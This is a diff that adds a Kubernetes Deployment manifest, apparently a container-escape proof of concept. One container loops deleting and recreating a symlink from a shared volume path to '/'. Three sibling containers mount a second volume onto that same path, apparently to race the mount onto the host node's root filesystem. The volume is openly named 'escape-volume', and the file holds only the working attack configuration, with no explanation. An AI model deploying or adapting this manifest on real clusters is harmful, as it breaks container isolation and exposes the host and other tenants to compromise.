@@ -1,0 +1,55 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: honk
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: honk
+  template:
+    metadata:
+      labels:
+        app: honk
+    spec:
+      containers:
+      - image: nginx:stable
+        imagePullPolicy: Never
+        name: 0-link
+        command: ["/bin/bash"]
+        args: ["-c", "cd /honk; while true; do rm -rf host; ln -s / host; done;"]
+        volumeMounts:
+        - mountPath: /honk
+          name: escape-volume
+      - image: nginx:stable
+        imagePullPolicy: Never
+        name: 1-honk
+        command: ["sleep", "infinity"]
+        volumeMounts:
+        - mountPath: /honk
+          name: escape-volume
+        - mountPath: /honk/host
+          name: host-volume
+      - image: nginx:stable
+        imagePullPolicy: Never
+        name: 2-honk
+        command: ["sleep", "infinity"]
+        volumeMounts:
+        - mountPath: /honk
+          name: escape-volume
+        - mountPath: /honk/host
+          name: host-volume
+      - image: nginx:stable
+        imagePullPolicy: Never
+        name: 3-honk
+        command: ["sleep", "infinity"]
+        volumeMounts:
+        - mountPath: /honk
+          name: escape-volume
+        - mountPath: /honk/host
+          name: host-volume
+      volumes:
+      - name: escape-volume
+        emptyDir: {}
+      - name: host-volume
+        emptyDir: {}
